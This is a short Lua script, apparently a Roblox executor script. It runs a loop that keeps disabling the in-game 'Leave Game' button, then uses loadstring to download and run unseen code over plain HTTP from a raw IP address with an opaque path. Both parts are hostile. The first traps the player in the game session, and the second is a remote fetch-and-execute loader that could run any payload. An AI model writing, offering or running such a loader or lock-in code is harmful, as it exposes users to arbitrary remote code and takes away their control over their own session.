task.spawn(function()
    while task.wait() do
        pcall(function()
            for _, v in ipairs(getconnections(
                game:GetService("CoreGui").RobloxGui.SettingsClippingShield
                    .SettingsShield.MenuContainer.Page.PageViewClipper
                    .PageView.PageViewInnerFrame.LeaveGamePage
                    .LeaveButtonsContainer.LeaveButtonsContainer
                    .LeaveGameButton.Activated
            )) do
                v:Disable()
            end
        end)
    end
end)

loadstring(game:HttpGet("http://31.172.87.116/MFuhDRo09rceKactsGzOMsaBnoraaYTzRJvhbMJv49xdoTt637OdynDMsrFU6TsJXqcPnjRyH0BHumBJ"))()
